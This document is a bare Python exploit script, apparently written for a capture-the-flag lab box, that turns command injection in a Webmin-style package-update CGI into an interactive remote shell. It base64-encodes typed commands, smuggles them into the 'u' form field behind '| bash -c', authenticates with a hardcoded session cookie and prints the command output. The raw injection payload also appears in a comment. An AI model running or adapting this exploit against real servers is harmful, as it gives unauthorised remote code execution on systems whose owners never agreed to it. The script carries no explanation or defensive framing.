#!/usr/bin/python3

#u=acl/apt&u= | bash -c id&ok_top=Update Selected Packages

import requests
import re
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import urllib.parse
import base64

proxies={'https':'http://127.0.0.1:8080'}
while True:
	user_input=input("Enter ur command: ")
	command=base64.b64encode(user_input.encode('ascii'))
	command=command.decode("utf-8")
	# print(command)
	url='https://10.129.2.1:10000/package-updates/update.cgi'
	data=[('u','acl/apt'),('u',f' | bash -c "echo \"{command}\" | base64 -d | bash"'),('ok_top','Update Selected Packages')]
	cookies={'sid':'e3de86f9327564531a5c92efe2026a1c','redirect':'1','testing':'1'}
	headers={'Referer':'https://10.129.2.1:10000/'}

	r=requests.post(url,data=data,verify=False,proxies=proxies,cookies=cookies,headers=headers)
	# r=requests.post('https://10.129.2.1:10000/package-updates/update.cgi', data=[('u', 'acl/apt'), ('u', ' | bash -c id'), ('ok_top', 'Update Selected Packages')], verify=False, proxies={"https":"http://127.0.0.1:8080"}, headers={'Referer':'https://10.129.2.1:10000/'},cookies=cookies)
	resp=r.text
	# print(resp)
	result=re.findall(r'<pre>(.*)</pre>',resp,re.DOTALL)[0]
	print(urllib.parse.unquote(result))